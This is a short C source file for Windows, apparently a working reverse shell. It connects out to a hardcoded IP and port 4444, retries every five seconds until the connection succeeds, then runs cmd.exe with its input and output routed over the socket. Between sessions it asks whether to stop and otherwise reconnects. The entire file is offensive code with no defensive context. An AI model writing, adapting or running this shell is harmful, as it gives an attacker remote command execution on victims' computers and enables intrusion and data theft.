#include <ws2tcpip.h>
#include <windows.h>

// connect back to this ip:port
#define HOST_IP "192.168.0.12"
#define HOST_PORT 4444

#define RETRY_MS 5000

int main() {
	
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	
	while (1) {
		
		// create socket
		SOCKET mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
		struct sockaddr_in addr;
		memset(&addr, 0, sizeof(addr));
		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr = inet_addr(HOST_IP);  
		addr.sin_port = htons(HOST_PORT);    
		
		// connect, if it fails sleep then retry
		if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) { closesocket(mySocket); Sleep(RETRY_MS); continue; }
		
		// start cmd.exe and redirect std IOE
		char Process[] = "cmd.exe";
		STARTUPINFO sinfo;
		memset(&sinfo, 0, sizeof(sinfo));
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
		sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket;
		PROCESS_INFORMATION pinfo;
		memset(&pinfo, 0, sizeof(pinfo));
		CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
		WaitForSingleObject(pinfo.hProcess, INFINITE);
		CloseHandle(pinfo.hProcess);
		CloseHandle(pinfo.hThread);
		
		// stop shell?
		char RecvData[8];
		memset(RecvData, 0, sizeof(RecvData));
		char msg[] = "Stop shell? [y/N]: ";
		if (send(mySocket, msg, strlen(msg), 0) == SOCKET_ERROR) { closesocket(mySocket); continue; }
		if (recv(mySocket, RecvData, 8-1, 0) <= 0) { closesocket(mySocket); continue; }
		if (strcmp(RecvData, "y\n") == 0) { return 0; }
		
		closesocket(mySocket);
	}
	
	WSACleanup();
	
	return 0;
}
